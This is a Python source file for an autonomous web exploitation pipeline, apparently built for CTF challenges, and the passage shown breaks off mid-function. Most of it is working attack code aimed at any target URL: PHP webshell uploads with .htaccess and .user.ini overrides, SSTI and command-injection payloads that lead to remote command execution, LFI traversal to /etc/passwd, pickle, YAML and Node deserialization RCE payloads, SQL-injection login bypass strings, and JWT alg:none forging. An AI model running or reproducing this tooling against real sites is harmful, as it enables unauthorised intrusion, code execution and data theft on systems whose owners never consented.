"""
Autonomous 7-Phase Web CTF Offensive Pipeline with Persistent Memory & Adaptive Learning.
Executes Recon, Statistical Analysis, Threat Modeling, Active Exploitation,
Privilege Escalation, Post-Exploitation, and Multi-Flag Hunting.
"""

import re
import os
import io
import itertools
import time
import json
import base64
import random
import requests
from PIL import Image
from urllib.parse import urljoin, urlparse, parse_qs
from typing import List, Dict, Any, Optional, Tuple



from core.ui import (
    console, print_header, print_success, print_info,
    print_warning, print_error, print_flag, print_table, print_code
)
from core.utils import find_flags, create_session
from core.memory import LearningEngine, SessionStorage, LootManager
from modules.scanner import scan_target, extract_forms_and_links, fingerprint_tech
from modules.encoder import decode_all, auto_smart_decode
from modules.ssti import get_all_ssti_engines, DETECTION_PAYLOADS
from modules.jwt_tool import decode_jwt, forge_alg_none, sign_jwt_hs256, bruteforce_secret
from modules.cheatsheet import analyze_code_snippet, PHP_QUIRKS
from modules.response_analyzer import ResponseAnalyzer
from modules.bypass_engine import BypassEngine
from modules.chaining_engine import VulnerabilityChainEngine
from modules.container_escape import ContainerEscapeAdvisor
from modules.deserializer import (
    generate_pickle_payload, generate_pyyaml_payload,
    generate_nodejs_serialize_payload, generate_php_serialized_object
)
from modules.client_side import ClientSideAnalyzer
from modules.php_tricks import PHPTricksEngine
from modules.eval_injection import EvalInjectionEngine




class AutoPwnPipeline:
    """
    7-Phase Enterprise Web CTF Autonomous Exploit Engine.
    """
    def __init__(self, target_url: str, step_by_step: bool = False, custom_flag_prefix: Optional[str] = None):
        self.target_url = target_url.strip()
        self.step_by_step = step_by_step
        self.flag_prefix = custom_flag_prefix
        self.session = create_session()
        self.learning_engine = LearningEngine()
        
        # State tracking across all 7 phases
        self.state = {
            "target_url": self.target_url,
            "tech_stack": [],
            "endpoints": set(),
            "forms": [],
            "parameters": set(),
            "comments": [],
            "sensitive_hits": [],
            "cookies": {},
            "jwt_tokens": [],
            "scripts": set(),
            "inline_scripts": [],
            "leaked_source_files": {}, # filename -> content
            "leaked_secrets": {},      # key -> value
            "vulnerabilities": [],     # list of discovered flaws
            "priv_esc_vectors": [],
            "captured_flags": set(),
            "attack_steps": [],        # list of step descriptions
            "curl_commands": [],
            "active_rce_method": None  # function/lambda to execute system commands
        }

    def _log_step(self, phase_name: str, description: str, details: str = "", curl_cmd: str = ""):
        """Record an attack step in the Attack Graph."""
        step_entry = {
            "phase": phase_name,
            "description": description,
            "details": details,
            "timestamp": time.strftime("%H:%M:%S")
        }
        self.state["attack_steps"].append(step_entry)
        if curl_cmd:
            self.state["curl_commands"].append(curl_cmd)

    def _check_and_store_flags(self, text: str, source_context: str = ""):
        """Scan text for CTF flags, print victory panel, and store in state."""
        found = find_flags(text, self.flag_prefix)
        if found:
            for f in set(found):
                if f not in self.state["captured_flags"]:
                    self.state["captured_flags"].add(f)
                    print_flag(f)
                    self._log_step("Phase 7: Flag Capture", f"Captured flag from {source_context}: {f}")

    def run(self):
        """Execute the complete 7-Phase Offensive Pipeline."""
        console.print(f"\n[bold magenta]══════════════════════════════════════════════════════════════════════════════[/bold magenta]")
        console.print(f"[bold yellow]  ►► STARTING 7-PHASE AUTONOMOUS OFFENSIVE PIPELINE ◄◄[/bold yellow]")
        console.print(f"[bold cyan]  Target Challenge URL: [/bold cyan][bold white]{self.target_url}[/bold white]")
        console.print(f"[bold magenta]══════════════════════════════════════════════════════════════════════════════[/bold magenta]\n")

        try:
            # Phase 1: Information Gathering & Reconnaissance
            self.phase1_reconnaissance()

            # Phase 2: Scanning & Statistical Analysis
            self.phase2_statistical_analysis()

            # Phase 3: Vulnerability Analysis & Threat Modeling
            self.phase3_threat_modeling()

            # Phase 4: Active Exploitation
            self.phase4_active_exploitation()

            # Phase 5: Privilege Escalation
            self.phase5_privilege_escalation()

            # Phase 6: Post-Exploitation & Persistence
            self.phase6_post_exploitation()

            # Phase 7: Multi-Flag Hunting & Victory Reporting
            self.phase7_multi_flag_hunting()

        except KeyboardInterrupt:
            print_warning("\nPipeline paused by user. Saving current session state...")

        # Final Persistence & Memory Update
        self._save_session_and_loot()

    # =========================================================================
    # PHASE 1: جمع المعلومات والاستطلاع (Information Gathering & Reconnaissance)
    # =========================================================================
    def phase1_reconnaissance(self):
        print_header("المرحلة 1: جمع المعلومات والاستطلاع", "Phase 1: Deep Recon & Asset Scraping")
        
        # 1. Fetch Root Page
        try:
            r = self.session.get(self.target_url, timeout=7)
            self.state["endpoints"].add(self.target_url)
            self.state["baseline_html"] = r.text
            self._check_and_store_flags(r.text, "Root Web Page")
            
            # Extract headers & cookies
            headers_dict = dict(r.headers)
            cookies_dict = r.cookies.get_dict()
            self.state["cookies"].update(cookies_dict)

            
            # Check JWT in cookies
            for cname, cval in cookies_dict.items():
                if cval.count(".") == 2:
                    self.state["jwt_tokens"].append((cname, cval))
                    print_info(f"Detected JWT Token in cookie '[bold cyan]{cname}[/bold cyan]'")

            # Tech fingerprinting
            self.state["tech_stack"] = fingerprint_tech(headers_dict, r.text, cookies_dict)
            print_success(f"Fingerprinted Technologies: {', '.join(self.state['tech_stack']) or 'Standard Web'}")

            # 2. Extract HTML Comments & Inline Secrets
            comments = re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
            for c in comments:
                c_clean = c.strip()
                if c_clean:
                    self.state["comments"].append(c_clean)
                    self._check_and_store_flags(c_clean, "HTML Comment")
            if self.state["comments"]:
                print_info(f"Extracted {len(self.state['comments'])} HTML Comments.")

            # 3. Deep Link & Form Parsing
            parsed = extract_forms_and_links(r.text, self.target_url)
            for l in parsed["links"]:
                self.state["endpoints"].add(l)
            for p in parsed["parameters"]:
                self.state["parameters"].add(p)
            for s in parsed.get("scripts", []):
                self.state["scripts"].add(s)
            self.state["inline_scripts"].extend(parsed.get("inline_scripts", []))
            self.state["forms"].extend(parsed["forms"])

            print_info(f"Discovered [bold green]{len(self.state['endpoints'])}[/bold green] Endpoints, [bold green]{len(self.state['forms'])}[/bold green] Forms, [bold green]{len(self.state['scripts'])}[/bold green] Scripts, [bold green]{len(self.state['parameters'])}[/bold green] Input Parameters.")

        except Exception as e:
            print_error(f"Failed to connect to target URL: {e}")
            return


        # 4. Probe CTF Sensitive Paths (.git, .env, backups, etc.)
        print_info("Probing CTF source leaks (.git, .env, backups, Dockerfile)...")
        hits = scan_target(self.target_url, max_workers=8, flag_prefix=self.flag_prefix)
        self.state["sensitive_hits"] = hits
        
        for h in hits:
            if h["status"] == 200:
                print_success(f"Sensitive Asset Found: [bold yellow]{h['path']}[/bold yellow] (Size: {h['length']} bytes)")
                self._log_step("Phase 1: Recon", f"Discovered sensitive file: {h['path']}", curl_cmd=f"curl -s {h['url']}")
                # If .env or config file leaked, save to loot
                if any(x in h["path"] for x in [".env", "config", "app.py", "backup", "flag"]):
                    try:
                        content = self.session.get(h["url"], timeout=5).text
                        LootManager.save_source_file(self.target_url, h["path"], content)
                        self._check_and_store_flags(content, h["path"])
                    except Exception:
                        pass

    # =========================================================================
    # PHASE 2: الفحص والتحليل الإحصائي (Scanning & Statistical Analysis)
    # =========================================================================
    def phase2_statistical_analysis(self):
        print_header("المرحلة 2: الفحص والتحليل الإحصائي", "Phase 2: Statistical & Response Profiling")
        
        # 1. Baseline Response Measurement & Semantic Diagnostic Check
        try:
            t0 = time.time()
            base_resp = self.session.get(self.target_url, timeout=5)
            base_time = time.time() - t0
            base_len = len(base_resp.content)
            print_info(f"Baseline Profile: Status {base_resp.status_code} | Length: {base_len} bytes | Latency: {base_time:.2f}s")
            
            # Semantic response diagnostic
            diag = ResponseAnalyzer.analyze_response(base_resp.text, base_resp.status_code, dict(base_resp.headers))
            summary = ResponseAnalyzer.format_diagnostic_summary(diag)
            if summary:
                console.print(summary)
            if diag["leaked_paths"]:
                self.state["sensitive_hits"].extend([{"path": p, "status": 200, "length": 0, "url": self.target_url} for p in diag["leaked_paths"]])
        except Exception:
            pass

        # 2. Parameter Reflection Context Check
        canary = "ctf_canary_8819"
        reflected_params = []
        for param in list(self.state["parameters"])[:6]:
            try:
                test_url = f"{self.target_url}?{param}={canary}"
                r = self.session.get(test_url, timeout=4)
                if canary in r.text:
                    reflected_params.append(param)
            except Exception:
                pass

        if reflected_params:
            print_success(f"Reflected Input Parameters Detected: {', '.join(reflected_params)}")
            self._log_step("Phase 2: Analysis", f"Parameters reflecting input: {reflected_params}")

        # 3. JWT Inspection
        for cname, token in self.state["jwt_tokens"]:
            decoded = decode_jwt(token)
            if decoded:
                print_info(f"JWT Header: {decoded.get('header')} | Claims: {decoded.get('payload')}")
                self._log_step("Phase 2: Analysis", f"JWT token inspected on cookie {cname}")

    # =========================================================================
    # PHASE 3: تحليل الثغرات والنمذجة (Vulnerability Analysis & Threat Modeling)
    # =========================================================================
    def phase3_threat_modeling(self):
        print_header("المرحلة 3: تحليل الثغرات والنمذجة", "Phase 3: Attack Surface & Threat Modeling")
        
        attack_surface = []
        
        # Classify parameters
        for p in self.state["parameters"]:
            pl = p.lower()
            if any(k in pl for k in ["file", "page", "include", "view", "path", "doc", "template"]):
                attack_surface.append(("High", "LFI / Path Traversal / SSTI", f"Param: {p}"))
            elif any(k in pl for k in ["cmd", "ip", "host", "ping", "exec", "query", "run"]):
                attack_surface.append(("Critical", "Command Injection", f"Param: {p}"))
            elif any(k in pl for k in ["id", "user", "name", "search", "q", "category"]):
                attack_surface.append(("High", "SQL Injection / SSTI", f"Param: {p}"))
            elif any(k in pl for k in ["url", "link", "redirect", "src", "fetch"]):
                attack_surface.append(("High", "SSRF / Open Redirect", f"Param: {p}"))

        # Forms
        for f in self.state["forms"]:
            action = f["action"]
            input_names = [i["name"] for i in f["inputs"]]
            if any("pass" in n.lower() for n in input_names):
                attack_surface.append(("Critical", "Authentication Bypass / SQLi / Type Juggling", f"Form: {action}"))
            elif any(i.get("type") == "file" for i in f["inputs"]):
                attack_surface.append(("Critical", "Arbitrary File Upload / Webshell", f"Upload Form: {action}"))

        if self.state["jwt_tokens"]:
            attack_surface.append(("Critical", "JWT None Alg / Secret Brute Force", "Cookie Tokens"))

        if attack_surface:
            print_table(
                ["Priority", "Vulnerability Class", "Target Surface Vector"],
                [[p, v, s] for p, v, s in attack_surface],
                title="Threat Modeling Attack Vectors"
            )
        else:
            print_info("Standard attack surface mapped across discovered endpoints.")

    # =========================================================================
    # PHASE 4: الاستغلال الفعلي (Active Exploitation)
    # =========================================================================

    def phase4_active_exploitation(self):
        print_header("المرحلة 4: الاستغلال الفعلي", "Phase 4: Active Multi-Vector Exploitation")
        
        # 1. Arbitrary File Upload & Webshells
        self._exploit_file_upload()

        # 2. SSTI Probing & Weaponization
        self._exploit_ssti()

        # 3. LFI & PHP Stream Wrappers Probing
        self._exploit_lfi()

        # 4. Command Injection Probing
        self._exploit_command_injection()

        # 5. Insecure Deserialization Probing
        self._exploit_deserialization()

        # 6. SQL Injection & Auth Bypasses
        self._exploit_sqli()

        # 7. JWT Exploitation
        self._exploit_jwt()

        # 8. Client-Side Cryptographic & Scrambled Binary / Image Reconstruction
        self._exploit_client_side_crypto()

        # 9. PHP-Specific Logic, Type Juggling, Header Spoofing & Stream Wrappers
        self._exploit_php_tricks()

        # 10. Eval / Code Injection RCE (Python eval, Node.js eval, PHP eval)
        self._exploit_eval_injection()


    def _exploit_file_upload(self):
        """Active Arbitrary File Upload prober and Webshell executor (PHP / Htaccess / User.ini / Magic Bytes)."""
        print_info("Testing Arbitrary File Upload & Webshell Vectors...")
        
        # 1. Identify upload forms and upload endpoints
        upload_targets = []
        for form in self.state["forms"]:
            for inp in form.get("inputs", []):
                if inp.get("type") == "file":
                    upload_targets.append({
                        "action": form["action"],
                        "method": form.get("method", "POST"),
                        "field_name": inp.get("name", "file")
                    })
        
        # If no explicit form with type=file found, check standard upload endpoints
        if not upload_targets:
            for ep in ["upload.php", "upload", "file_upload.php", "uploader.php", "api/upload"]:
                test_ep = urljoin(self.target_url, ep)
                try:
                    r_test = self.session.get(test_ep, timeout=3)
                    if r_test.status_code in [200, 405, 500] or "upload" in r_test.text.lower():
                        upload_targets.append({
                            "action": test_ep,
                            "method": "POST",
                            "field_name": "file"
                        })
                except Exception:
                    pass

        if not upload_targets:
            return

        webshell_php = b'GIF89a; <?php system($_GET["cmd"]); ?>'
        test_flag_cmd = "id; whoami; cat /var/www/flag.txt || cat /var/www/*flag* || cat /flag* || cat /flag.txt || cat /app/flag* || find / -name '*flag*' 2>/dev/null"
        
        for target in upload_targets:
            action_url = target["action"]
            field_name = target["field_name"]
            print_info(f"Targeting File Upload Endpoint: [bold cyan]{action_url}[/bold cyan] (Field: [bold yellow]{field_name}[/bold yellow])")

            upload_attempts = [
                # 1. Server Configuration Overwrite (.htaccess)
                {
                    "name": "Apache .htaccess Handler Override",
                    "files": [
                        (".htaccess", b"AddType application/x-httpd-php .png .gif .jpg\nSetHandler application/x-httpd-php\nphp_flag engine on\n", "image/gif"),
                        ("shell.png", webshell_php, "image/png")
                    ],
                    "expected_shell": "shell.png"
                },
                # 2. PHP-FPM Configuration (.user.ini)
                {
                    "name": "PHP-FPM .user.ini Auto-Prepend",
                    "files": [
                        (".user.ini", b"auto_prepend_file=shell.png\n", "text/plain"),
                        ("shell.png", webshell_php, "image/png")
                    ],
                    "expected_shell": "shell.png"
                },
                # 3. Direct PHP Webshells with MIME & Magic Bytes
                {
                    "name": "GIF Magic Bytes Webshell (.php)",
                    "files": [("shell.php", webshell_php, "image/gif")],
                    "expected_shell": "shell.php"
                },
                {
                    "name": "PHTML Webshell (.phtml)",
                    "files": [("shell.phtml", webshell_php, "image/gif")],
                    "expected_shell": "shell.phtml"
                },
                {
                    "name": "PHP5 Webshell (.php5)",
                    "files": [("shell.php5", webshell_php, "image/gif")],
                    "expected_shell": "shell.php5"
                },
                {
                    "name": "PHAR Webshell (.phar)",
                    "files": [("shell.phar", webshell_php, "image/gif")],
                    "expected_shell": "shell.phar"
                },
                {
                    "name": "Double Extension (.php.jpg / .jpg.php)",
                    "files": [("shell.php.jpg", webshell_php, "image/jpeg")],
                    "expected_shell": "shell.php.jpg"
                },
                {
                    "name": "Case Variation (.pHp)",
                    "files": [("shell.pHp", webshell_php, "image/gif")],
                    "expected_shell": "shell.pHp"
                }
            ]

            for attempt in upload_attempts:
                t_name = attempt["name"]
                files_to_upload = attempt["files"]
                expected_filename = attempt["expected_shell"]

                last_upload_resp = None
                for fname, fcontent, ftype in files_to_upload:
                    try:
                        multipart_data = {field_name: (fname, fcontent, ftype)}
                        r_up = self.session.post(action_url, files=multipart_data, timeout=5)
                        last_upload_resp = r_up
                    except Exception:
                        pass

                if not last_upload_resp:
                    continue

                possible_paths = []
                # 1. Look for href/src links in upload response
                found_links = re.findall(r"(?:href|src)=['\"]([^'\"]+)['\"]", last_upload_resp.text, re.IGNORECASE)
                for fl in found_links:
                    if expected_filename in fl or fl.endswith(".php") or fl.endswith(".png"):
                        possible_paths.append(urljoin(action_url, fl))
                
                # 2. Look for relative paths in text (e.g. images/shell.png, uploads/shell.png)
                text_paths = re.findall(r"([a-zA-Z0-9_\-\.\/]+" + re.escape(expected_filename) + r")", last_upload_resp.text)
                for tp in text_paths:
                    possible_paths.append(urljoin(action_url, tp))

                # 3. Standard directory candidates
                base_dir = urljoin(action_url, "./")
                for folder in ["", "images/", "uploads/", "files/", "static/uploads/", "media/", "tmp/"]:
                    cand = urljoin(base_dir, f"{folder}{expected_filename}")
                    if cand not in possible_paths:
                        possible_paths.append(cand)

                # Test execution across candidate URLs
                for exec_candidate in set(possible_paths):
                    try:
                        r_exec = self.session.get(exec_candidate, params={"cmd": test_flag_cmd}, timeout=5)
                        
                        prev_flags_count = len(self.state["captured_flags"])
                        self._check_and_store_flags(r_exec.text, f"File Upload RCE ({t_name})")
                        new_flags_found = len(self.state["captured_flags"]) > prev_flags_count
                        
                        is_executing = ("uid=" in r_exec.text or "www-data" in r_exec.text or "groups=" in r_exec.text) and "<?php" not in r_exec.text
                        if is_executing or new_flags_found:
                            print_success(f"Arbitrary File Upload RCE Confirmed via [bold green]{t_name}[/bold green]!")
                            print_success(f"Active Webshell URL: [bold cyan]{exec_candidate}[/bold cyan]")
                            
                            self._log_step("Phase 4: Exploitation", f"Webshell uploaded via {t_name}", curl_cmd=f"curl '{exec_candidate}?cmd=id'")
                            self.state["active_rce_method"] = lambda cmd, u=exec_candidate: self.session.get(u, params={"cmd": cmd}).text
                            
                            LootManager.save_loot_file(self.target_url, "webshell_url.txt", f"Webshell URL: {exec_candidate}\nAttack Method: {t_name}")
                            self.learning_engine.record_success(
                                self.target_url, self.state["tech_stack"], "file_upload", t_name, f"Uploaded {expected_filename}", list(self.state["captured_flags"])
                            )
                            return
                    except Exception:
                        pass

    def _exploit_ssti(self):
        """Active SSTI prober and RCE executor with intelligent error diagnosis, Form/POST support, and WAF mutation."""
        print_info("Testing SSTI Expression Vectors...")
        
        # Build target vectors from discovered forms and URL parameters
        targets = []
        for form in self.state.get("forms", []):
            action_url = form.get("action") or self.target_url
            method = form.get("method", "POST").upper()
            for inp in form.get("inputs", []):
                name = inp.get("name")
                if name and inp.get("type") not in ["file", "submit", "image"]:
                    targets.append({"url": action_url, "method": method, "param": name})
        
        for param in self.state.get("parameters", []):
            targets.append({"url": self.target_url, "method": "GET", "param": param})
            
        if not targets:
            for p in ["content", "name", "template", "page", "q", "msg", "text"]:
                targets.append({"url": self.target_url, "method": "POST", "param": p})
                targets.append({"url": self.target_url, "method": "GET", "param": p})

        engines = get_all_ssti_engines()
        baseline = self.state.get("baseline_html", "")
        flag_cmd = "cat /challenge/flag || cat /challenge/flag.txt || cat /var/www/flag.txt || cat /flag* || cat /flag.txt || cat flag.txt || cat /app/flag* || find / -name '*flag*' 2>/dev/null"

        
        for tgt in targets:
            url = tgt["url"]
            method = tgt["method"]
            param = tgt["param"]
            
            # Generate high-entropy arithmetic multiplication to prevent static HTML false positives
            a, b = random.randint(1111, 9999), random.randint(1111, 9999)
            expected_calc = str(a * b)

            probes = [
                (f"{{{{{a}*{b}}}}}", expected_calc, "Basic Arithmetic"),
                (f"${{{a}*{b}}}", expected_calc, "Mako/Spring"),
                (f"<%= {a}*{b} %>", expected_calc, "ERB")
            ]
            
            # Add mutated level 2 and level 3 SSTI bypasses
            for mut in BypassEngine.mutate_ssti("jinja2", flag_cmd, level=3):
                probes.append((mut["payload"], "picoCTF{", mut["name"]))

            for probe_expr, expected, probe_type in probes:
                try:
                    if method == "POST":
                        r = self.session.post(url, data={param: probe_expr}, timeout=5)
                    else:
                        r = self.session.get(url, params={param: probe_expr}, timeout=5)
                    
                    self._check_and_store_flags(r.text, f"SSTI ({probe_type})")
                    
                    if len(self.state["captured_flags"]) > 0:
                        print_success(f"SSTI Exploited & Flag Captured on [bold yellow]{param}[/bold yellow] via {probe_type}!")
                        self._log_step("Phase 4: Exploitation", f"SSTI exploit succeeded on {param} ({probe_type})")
                        self.learning_engine.record_success(
                            self.target_url, self.state["tech_stack"], "ssti", probe_type, probe_expr, list(self.state["captured_flags"])
                        )
                        return

                    # Cognitive response analysis
                    diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=probe_expr)
                    if diag["ssti_errors"] or diag["waf_detected"]:
                        summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                        if summary:
                            console.print(summary)

                    if expected in r.text and probe_expr not in r.text and expected not in baseline:
                        print_success(f"SSTI Confirmed on parameter [bold yellow]{param}[/bold yellow] ({method}) via '{probe_expr[:30]}'!")
                        self._log_step("Phase 4: Exploitation", f"SSTI confirmed on {param}", curl_cmd=f"curl -X {method} '{url}'")
                        
                        # Weaponize Jinja2 / Python RCE
                        target_cmds = [
                            "cat /challenge/flag",
                            "cat /challenge/flag.txt",
                            "cat /var/www/flag.txt",
                            "cat /flag*",
                            "cat /flag.txt",
                            "cat flag.txt",
                            "cat /app/flag*",
                            flag_cmd
                        ]
                        
                        for single_cmd in target_cmds:
                            all_rce_payloads = BypassEngine.mutate_ssti("jinja2", single_cmd, level=3) + engines.get("jinja2", lambda c: [])(single_cmd)
                            prioritized = self.learning_engine.prioritize_payloads("ssti", self.state["tech_stack"], all_rce_payloads)
                            
                            for p in prioritized:
                                payload_str = p["payload"]
                                if method == "POST":
                                    r_rce = self.session.post(url, data={param: payload_str}, timeout=5)
                                else:
                                    r_rce = self.session.get(url, params={param: payload_str}, timeout=5)
                                    
                                self._check_and_store_flags(r_rce.text, f"SSTI RCE ({p['name']})")
                                
                                # Check if command execution succeeded
                                if "root:" in r_rce.text or "uid=" in r_rce.text or len(self.state["captured_flags"]) > 0:
                                    print_success(f"SSTI RCE Executed Successfully via: {p['name']}")
                                    self.learning_engine.record_success(
                                        self.target_url, self.state["tech_stack"], "ssti", p["name"], payload_str, list(self.state["captured_flags"])
                                    )
                                    return

                except Exception:
                    pass



    def _exploit_lfi(self):
        """Active LFI and PHP filter source code extractor with mutation support."""
        print_info("Testing LFI & Source Code Extraction Vectors...")
        test_params = list(self.state["parameters"])
        if not test_params:
            test_params = ["file", "page", "include", "view", "path", "template", "doc"]

        lfi_payloads = [
            ("php_filter_b64", "php://filter/convert.base64-encode/resource=app.py"),
            ("php_filter_b64_index", "php://filter/convert.base64-encode/resource=index.php"),
            ("php_filter_b64_config", "php://filter/convert.base64-encode/resource=config.php"),
            ("traversal_passwd", "../../../../../../../../etc/passwd"),
            ("traversal_nested", "....//....//....//....//etc/passwd"),
            ("traversal_app", "../../../../../../../../app/app.py"),
            ("traversal_proc", "../../../../../../../../proc/self/environ"),
        ]

        prioritized_lfi = self.learning_engine.prioritize_payloads(
            "lfi", self.state["tech_stack"], [{"name": name, "payload": pay} for name, pay in lfi_payloads]
        )

        for param in test_params:
            for item in prioritized_lfi:
                pay = item["payload"]
                try:
                    r = self.session.get(self.target_url, params={param: pay}, timeout=4)
                    
                    # Cognitive response analysis
                    diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=pay)
                    if diag["lfi_errors"] or diag["waf_detected"]:
                        summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                        if summary:
                            console.print(summary)
                    
                    # Check /etc/passwd
                    if "root:x:0:0:" in r.text:
                        print_success(f"LFI Verified on parameter [bold yellow]{param}[/bold yellow] via '{pay}'!")
                        self._log_step("Phase 4: Exploitation", f"LFI confirmed on {param}", details="/etc/passwd extracted")
                        self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "lfi", item["name"], pay, [])
                    
                    # Check Base64 PHP/Source code
                    b64_matches = re.findall(r"[A-Za-z0-9+/=]{40,}", r.text)
                    for b64 in b64_matches:
                        try:
                            decoded = base64.b64decode(b64).decode("utf-8", errors="ignore")
                            if "<?php" in decoded or "import " in decoded or "def " in decoded or "SECRET" in decoded:
                                fname = pay.split("resource=")[-1] if "resource=" in pay else "leaked_source.py"
                                print_success(f"Source Code Leaked via LFI ({fname})! Saved to loot.")
                                self.state["leaked_source_files"][fname] = decoded
                                LootManager.save_source_file(self.target_url, fname, decoded)
                                self._check_and_store_flags(decoded, f"Leaked Source ({fname})")
                                self._log_step("Phase 4: Exploitation", f"Leaked {fname} source code via LFI", curl_cmd=f"curl '{self.target_url}?{param}={pay}'")
                                self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "lfi", item["name"], pay, list(self.state["captured_flags"]))
                        except Exception:
                            pass
                except Exception:
                    pass

    def _exploit_command_injection(self):
        """Active Command Injection prober with WAF mutation and error feedback."""
        print_info("Testing Command Injection Vectors...")
        test_params = list(self.state["parameters"])
        if not test_params:
            test_params = ["cmd", "ip", "host", "ping", "exec", "query"]

        probes = [
            ("sep_semicolon", "; id", "uid="),
            ("sep_pipe", "| id", "uid="),
            ("subshell", "$(id)", "uid="),
            ("backticks", "`id`", "uid="),
            ("newline", "%0aid%0a", "uid="),
            ("ifs_space", ";id$IFS$9", "uid="),
            ("brace_expansion", ";{id,}", "uid=")
        ]

        for param in test_params:
            for name, probe, indicator in probes:
                try:
                    r = self.session.get(self.target_url, params={param: probe}, timeout=4)
                    diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=probe)
                    if diag["waf_detected"]:
                        summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                        if summary:
                            console.print(summary)

                    if indicator in r.text:
                        print_success(f"Command Injection Confirmed on parameter [bold yellow]{param}[/bold yellow] via '{probe}'!")
                        self._log_step("Phase 4: Exploitation", f"Command Injection confirmed on {param}", curl_cmd=f"curl '{self.target_url}?{param}={probe}'")
                        
                        # Weaponize flag extraction
                        flag_r = self.session.get(self.target_url, params={param: "; cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null"}, timeout=5)
                        self._check_and_store_flags(flag_r.text, "Command Injection Output")
                        
                        self.state["active_rce_method"] = lambda cmd: self.session.get(self.target_url, params={param: f"; {cmd}"}).text
                        self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "cmd_inj", name, probe, list(self.state["captured_flags"]))
                        return
                except Exception:
                    pass

    def _exploit_deserialization(self):
        """Active Insecure Deserialization prober (Pickle, PyYAML, Node.js, PHP)."""
        print_info("Testing Insecure Deserialization Entrypoints...")
        test_params = list(self.state["parameters"])
        if not test_params:
            test_params = ["data", "payload", "session", "state", "obj", "config"]

        flag_cmd = "cat /flag* || cat /flag.txt"
        pickle_pay = generate_pickle_payload(flag_cmd)["Base64 Payload"]
        yaml_pay = generate_pyyaml_payload(flag_cmd)["Default Payload"]
        node_pay = generate_nodejs_serialize_payload(flag_cmd)["Base64 Command Payload"]

        deser_probes = [
            ("python_pickle", pickle_pay),
            ("pyyaml_unsafe", yaml_pay),
            ("nodejs_serialize", node_pay)
        ]

        for param in test_params:
            for name, payload_val in deser_probes:
                try:
                    r = self.session.get(self.target_url, params={param: payload_val}, timeout=5)
                    prev_flags = len(self.state["captured_flags"])
                    self._check_and_store_flags(r.text, f"Deserialization ({name})")
                    new_flags_found = len(self.state["captured_flags"]) > prev_flags
                    
                    if new_flags_found or "root:x:0:0:" in r.text or "uid=" in r.text:
                        print_success(f"Deserialization Exploitation Confirmed on parameter [bold yellow]{param}[/bold yellow] via {name}!")
                        self._log_step("Phase 4: Exploitation", f"Deserialization RCE on {param} ({name})")
                        self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "deserialization", name, payload_val[:30], list(self.state["captured_flags"]))
                        return
                except Exception:
                    pass

    def _exploit_sqli(self):
        """Active SQLi & Auth Bypass prober with database error identification and WAF evasion."""
        print_info("Testing SQLi Auth Bypass Vectors...")
        for form in self.state["forms"]:
            action = form["action"]
            method = form["method"]
            inputs = [i["name"] for i in form["inputs"] if i.get("type") not in ["submit", "button"]]
            
            if len(inputs) >= 1:
                auth_payloads = ["' OR 1=1-- -", "admin'-- -", "admin'#", "' OR '1'='1", "admin'/**/OR/**/1=1#"]
                for p in auth_payloads:
                    data = {name: p for name in inputs}
                    try:
                        if method == "POST":
                            r = self.session.post(action, data=data, timeout=4)
                        else:
                            r = self.session.get(action, params=data, timeout=4)
                            
                        # Cognitive response analysis for SQL errors
                        diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=p)
                        if diag["db_errors"] or diag["waf_detected"]:
                            summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                            if summary:
                                console.print(summary)

                        # Check if authenticated or flag found
                        self._check_and_store_flags(r.text, f"SQLi Auth Bypass ({action})")
                        if r.status_code in [302, 301] or any(k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout"]):
                            print_success(f"SQLi Authentication Bypass Succeeded on Form [bold yellow]{action}[/bold yellow] via '{p}'!")
                            self._log_step("Phase 4: Exploitation", f"SQLi Auth Bypass on {action}", curl_cmd=f"curl -X {method} {action} -d '{inputs[0]}={p}'")
                            self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "sqli", "auth_bypass", p, list(self.state["captured_flags"]))
                            break
                    except Exception:
                        pass

    def _exploit_jwt(self):
        """Active JWT None-Algorithm and Secret Cracker."""
        for cname, token in self.state["jwt_tokens"]:
            # 1. Test alg: none
            none_token = forge_alg_none(token, {"role": "admin", "user": "admin", "isAdmin": True})
            try:
                r = self.session.get(self.target_url, cookies={cname: none_token}, timeout=4)
                self._check_and_store_flags(r.text, "JWT Alg:None Response")
                if "admin" in r.text.lower() or "flag" in r.text.lower():
                    print_success(f"JWT Alg:None Bypass Succeeded on cookie '{cname}'!")
                    self.session.cookies.set(cname, none_token)
                    self._log_step("Phase 4: Exploitation", "JWT alg:none forged admin token")
            except Exception:
                pass

            # 2. Test weak secret brute force
            cracked = bruteforce_secret(token)
            if cracked:
                print_success(f"JWT Secret Key Cracked: [bold green]{cracked}[/bold green]")
                self.state["leaked_secrets"]["jwt_secret"] = cracked
                self._log_step("Phase 4: Exploitation", f"Cracked JWT Secret: {cracked}")

    def _exploit_client_side_crypto(self):
        """Active Client-Side JS Analysis, Auth Extraction, Deobfuscation & Scrambled Asset Reconstruction."""
        print_info("Testing Client-Side Cryptographic, JS Logic & Scrambled Asset Vectors...")
        html = self.state.get("baseline_html", "")
        
        # 1. Advanced Client-Side JavaScript Logic, Auth Checks & Deobfuscation
        scripts_to_analyze = []
        for s_url in self.state.get("scripts", []):
            try:
                r_js = self.session.get(s_url, timeout=5)
                if r_js.status_code == 200 and r_js.text:
                    script_name = s_url.split("/")[-1] or "external.js"
                    self.state["leaked_source_files"][script_name] = r_js.text
                    scripts_to_analyze.append((script_name, r_js.text, s_url))
            except Exception:
                pass
        
        for idx, inl_js in enumerate(self.state.get("inline_scripts", [])):
            if inl_js.strip():
                scripts_to_analyze.append((f"inline_script_{idx+1}.js", inl_js, self.target_url))

        for name, js_code, source_url in scripts_to_analyze:
            analysis = ClientSideAnalyzer.analyze_javascript(js_code, name)
            
            # Check flags in JS code
